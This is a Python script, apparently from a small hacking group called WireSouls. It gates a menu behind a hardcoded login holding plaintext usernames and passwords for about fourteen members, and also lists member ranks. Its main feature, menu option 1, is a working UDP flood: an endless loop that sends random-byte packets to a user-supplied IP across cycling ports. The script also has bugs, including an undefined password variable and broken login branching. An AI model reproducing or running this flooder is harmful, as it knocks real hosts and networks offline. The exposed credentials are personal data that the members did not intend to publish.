
from termcolor import colored
import sys
import os
import time
import socket
import random
from colorama import Fore ,Style
import pyfiglet
import time




x = 0 


##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############


user0 = ("test")
pass0 = ("test")

user1 = ("bananajoe")
pass1 = ("root")

user2 = ("max-cyber")
pass2 = ("cyber$$$$$$")

user3 = ("wb")
pass3 = ("2000")

user4 = ("m4do")
pass4 = ("hm887438")

user5 = ("virus")
pass4 = ("7043509483")

user6 = ("ali74")
pass6 = ("bon211")

user7 = ("yemenas")
pass7 = ("aa123456AA")


user8 = ("monsif")
pass8 = ("123123")

user9 = ("mokito")
pass9 = ("+kimo1+")

user10 = ("marwanb10")
pass10 = ("ana0258")

user11 = ("LMXR8")
pass11 = ("31428055")

user12 =("drcybersecuirty")
pass12 =("12341234")

user13 = ("Adrelaft")
pass13 = ("qweRtyuIop#&@987")
#this for clear
print(chr(27)+'[2j')
print('\033c')
print('\x1bc')


print ("#########################")
print ("#  Hey This is Private  #")
print ("#  Group You Have To    #")
print ("#  login to enter This  #")
print ("#         Group         #")
print ("#########################")
print (Fore.RED +"                        Warning")

print ("")
print ("")
username = input ("Enter Your Username : ")
password = input ("Enter Your Password : ")

if username == user1 and password == pass1 :
 print (Fore.GREEN + "[*] Cheking The username and password")
 time.sleep(2)
 print("[*] Starting WireSouls")
 time.sleep(4)
 x = x+ 10
if username == user2 and password == pass2 :
 print (Fore.GREEN + "[*] Cheking The username and password")
 time.sleep(2)
 print("[*] Starting WireSouls")
 time.sleep(4)
 x = x+ 10
if username == user3 and password == pass3 :
 print (Fore.GREEN + "[*] Cheking The username and password")
 time.sleep(2)
 print("[*] Starting WireSouls")
 time.sleep(4)
 x = x+ 10
if username == user4 and password == pass4 :
 print (Fore.GREEN + "[*] Cheking The username and password")
 time.sleep(2)
 print("[*] Starting WireSouls")
 time.sleep(4)
 x = x+ 10
if username == user5 and password == pass5 :
 print (Fore.GREEN + "[*] Cheking The username and password")
 time.sleep(2)
 print("[*] Starting WireSouls")
 time.sleep(4)
 x = x+ 10
if username == user6 and password == pass6 :
 print (Fore.GREEN + "[*] Cheking The username and password")
 time.sleep(2)
 print("[*] Starting WireSouls")
 time.sleep(4)
 x = x+ 10
if username == user7 and password == pass7 :
 print (Fore.GREEN + "[*] Cheking The username and password")
 time.sleep(2)
 print("[*] Starting WireSouls")
 time.sleep(4)
 x = x+ 10
if username == user8 and password == pass8 :
 print (Fore.GREEN + "[*] Cheking The username and password")
 time.sleep(2)
 print("[*] Starting WireSouls")
 time.sleep(4)
 x = x+ 10
if username == user9 and password == pass9 :
 print (Fore.GREEN + "[*] Cheking The username and password")
 time.sleep(2)
 print("[*] Starting WireSouls")
 time.sleep(4)
 x = x+ 10
if username == user10 and password == pass10 :
 print (Fore.GREEN + "[*] Cheking The username and password")
 time.sleep(2)
 print("[*] Starting WireSouls")
 time.sleep(4)
 x = x+ 10
if username == user11 and password == pass11 :
 print (Fore.GREEN + "[*] Cheking The username and password")
 time.sleep(2)
 print("[*] Starting WireSouls")
 time.sleep(4)
 x = x+ 10
if username == user12 and password == pass12 :
 print (Fore.GREEN + "[*] Cheking The username and password")
 time.sleep(2)
 print("[*] Starting WireSouls")
 time.sleep(4)
 x = x+ 10                                                         
if username == user13 and password == pass13 :
 print (Fore.GREEN + "[*] Cheking The username and password")
 time.sleep(2)
 print("[*] Starting WireSouls")
 time.sleep(4)
 x = x+ 10
                                             
if username == user0 and password == pass0 :
 print (Fore.GREEN + "[*] Cheking The username and password")
 time.sleep(2)
 print("[*] Starting WireSouls")
 time.sleep(4)
 x = x+ 10                                  

else :


 print (Fore.RED + "Error")


if x == 10 :
 #this for clear
 print(chr(27)+'[2j')
 print('\033c')
 print('\x1bc')

 a = pyfiglet.figlet_format("      WireSouls")
 print(Fore.RED + a)
 print ("")
 print (Fore.BLUE +"                                          By BananaJoe")


 print ("")
 print ("")
 print (" 1] DDos                              2] Ranks ")
 print (" 3] Who Are wireSouls                 4] Exit ")
 print ("")
 print ("")
 number = input (Fore.GREEN + "Enter Number : ")

 if number == ("1") :
                           
  ip = input("IP Target : ")
  port = int(input("Port       : "))

  os.system("clear")
  os.system("figlet Attack Starting")
  print ("[                    ] 0% ")
  time.sleep(2)
  print ("[=====               ] 25%")
  time.sleep(2)
  print ("[==========          ] 50%")
  time.sleep(2)
  print ("[===============     ] 75%")
  time.sleep(2)
  print ("[====================] 100%")
  time.sleep(3)
  sent = 0
  while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s",sent,ip,port)
     if port == 65534:
       port = 1
                                                                                                        
 elif number == ("2") :
  print ("")
  print (Fore.GREEN + "     Members                           Rank ")
  print (Fore.BLUE + """    bananajoe                         SouL
    M4do                              Member  
    virus                             Member
    marwanb10                         Member
    max-cyber                         Trapper
    mokito                            Member 
    ali74                             Member
    yemenas                           Member
    Adrelaft                          Member
    monsif                            Member
    LMXR8                             Member
    wb                                Noob
    test                              Guest
   """)

 elif number == ("3") :
  print ("wireSouls Are an arabic Private Hacking Group :( ")                          

 elif number == ("4") :
   x = x + 10

 
if x == 20 :
 print (Fore.RED + "GoodBye :( ")

